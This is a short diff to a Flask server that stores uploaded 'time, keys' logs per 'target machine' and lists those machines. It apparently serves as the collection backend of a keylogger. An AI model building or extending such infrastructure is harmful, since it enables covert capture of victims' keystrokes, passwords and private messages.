@@ -29,12 +29,14 @@ def upload():
     file_path = os.path.join(machine_folder, filename)
 
     # Additional processing can be added here, such as adding another timestamp inside the file
-    with open(file_path, "a", encoding="utf-8") as f:
+    with open(file_path, "w", encoding="utf-8") as f:
+        f.write("time, keys\n")
         f.write(log_data)
 
     return jsonify({"status": "success", "file": file_path}), 200
+
 @app.route('/api/get_target_machines_list', methods=['GET'])
-def get_targget_machines_list():
+def get_target_machines_list():
     """Returns a list of all machines that have logged data"""
     machines = os.listdir(DATA_FOLDER)
     return jsonify({"machines": machines})
